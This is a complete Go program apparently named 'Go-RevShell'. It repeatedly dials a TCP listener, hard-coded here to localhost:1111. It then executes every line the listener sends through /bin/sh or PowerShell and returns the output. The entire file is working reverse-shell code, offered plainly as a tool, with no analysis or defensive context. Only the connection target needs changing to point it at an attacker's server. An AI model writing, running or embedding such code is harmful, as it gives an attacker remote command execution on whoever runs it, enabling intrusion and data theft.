package main

import (
	"bufio"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const banner string = `
  ____                   ____                   ____    _              _   _
 / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
| |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
| |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
 \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|

`

func main() {
	keepConnexionAlive("localhost", 1111)
}

func keepConnexionAlive(host string, port int) {
	for {
		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		connexion.Write([]byte(banner + "[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
		var shell string
		switch runtime.GOOS {
		case "windows":
			shell = "powershell.exe"
		default:
			shell = "/bin/sh"
		}
		reverseShell(connexion, shell)
	}
}

func reverseShell(connexion net.Conn, shell string) {
	for {
		connexion.Write([]byte("[Go-RevShell@" + connexion.LocalAddr().String() + "] > "))
		clientEntry, _ := bufio.NewReader(connexion).ReadString('\n')
		clientEntry = strings.TrimSuffix(clientEntry, "\n")
		if clientEntry == "quit" {
			break
		}
		cmdOutput, err := exec.Command(shell, "-c", clientEntry).Output()
		var log []byte
		if err != nil {
			log = []byte("[-] Unknown command. Error : " + err.Error() + "\n")
		} else {
			log = []byte("[+] Command sent.\n")
		}
		connexion.Write(append(log, cmdOutput...))
	}
	connexion.Close()
}
